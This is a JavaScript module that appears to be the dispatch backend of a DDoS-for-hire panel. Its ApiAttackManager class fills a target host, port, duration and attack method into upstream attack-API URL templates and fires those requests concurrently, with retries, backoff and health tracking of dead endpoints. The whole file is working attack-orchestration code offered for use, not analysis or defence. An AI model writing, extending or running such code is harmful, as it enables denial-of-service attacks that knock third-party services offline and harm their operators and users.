const axios = require('axios');
const pLimit = require('p-limit');
const EndpointHealth = require('./EndpointHealth');

const limit = pLimit(5); // max 5 concurrent outbound HTTP requests

class ApiAttackManager {
    static TIMEOUT = 5000;       // 5s per request
    static MAX_RETRIES = 3;
    static BASE_DELAY = 500;     // Exponential: 500ms, 1s, 2s

    /**
     * Call a single API endpoint with exponential backoff retry.
     * Skips dead endpoints, marks failures.
     */
    static async callEndpoint(url) {
        // Skip dead endpoints
        if (EndpointHealth.isDead(url)) {
            return { success: false, skipped: true, endpoint: url, error: 'Endpoint marked dead (cooldown)' };
        }

        for (let i = 0; i < this.MAX_RETRIES; i++) {
            try {
                const res = await axios.get(url, { timeout: this.TIMEOUT });

                // Validate provider response body - standard "success" field checks
                const body = res.data;
                const isBodySuccess = (body && (
                    body.success === true ||
                    body.status === 'success' ||
                    body.status === 'OK' ||
                    body.error === false ||
                    (body.message && body.message.toLowerCase().includes('success')) ||
                    (body.message && body.message.toLowerCase().includes('sent'))
                ));

                if (isBodySuccess) {
                    EndpointHealth.markAlive(url);
                    return { success: true, data: body, endpoint: url };
                } else {
                    const errorMsg = body?.message || body?.error || 'Provider returned success:false';
                    throw new Error(errorMsg);
                }
            } catch (err) {
                EndpointHealth.markFail(url);
                console.error(`[API ERROR] Endpoint: ${url}, Error: ${err.message}`);
                if (i < this.MAX_RETRIES - 1) {
                    const delay = this.BASE_DELAY * Math.pow(2, i);
                    await new Promise(r => setTimeout(r, delay));
                } else {
                    return { success: false, endpoint: url, error: err.message };
                }
            }
        }
        return { success: false, endpoint: url, error: 'All retries exhausted' };
    }

    /**
     * Resolve URL template with attack data.
     */
    static resolveUrl(template, attackData) {
        return template
            .replace(/{host}/g, encodeURIComponent(attackData.host))
            .replace(/{port}/g, attackData.port)
            .replace(/{time}/g, attackData.time)
            .replace(/{method}/g, attackData.method)
            .replace(/{attackId}/g, attackData.id);
    }

    /**
     * Distribute load across healthy endpoints.
     * Each endpoint is called ONCE.
     */
    static distributeLoad(endpoints, concurrents) {
        const alive = endpoints.filter(e => !EndpointHealth.isDead(e));
        if (!alive.length) throw new Error('No healthy API endpoints available');

        // Force 'conc' to be capped at number of available endpoints
        // since external APIs typically don't accept multiple hits for 1 target
        const actualConc = Math.min(concurrents, alive.length);

        const distribution = alive.slice(0, actualConc).map(url => ({
            url,
            count: 1
        }));

        return distribution;
    }

    /**
     * Main dispatch — distribute load, fire with p-limit concurrency control.
     * Returns array of results.
     */
    static async dispatch(attackData, methodConf, concurrents) {
        const endpoints = methodConf.apiEndpoints || [];
        if (!endpoints.length) throw new Error('No API endpoints configured for this method');

        const distribution = this.distributeLoad(endpoints, concurrents);

        const tasks = distribution.flatMap(({ url, count }) =>
            Array(count).fill().map(() =>
                limit(() => this.callEndpoint(this.resolveUrl(url, attackData)))
            )
        );

        const results = await Promise.all(tasks);
        const succeeded = results.filter(r => r.success);

        return {
            success: succeeded.length > 0,
            total: results.length,
            succeeded: succeeded.length,
            failed: results.length - succeeded.length,
            results
        };
    }
}

module.exports = ApiAttackManager;
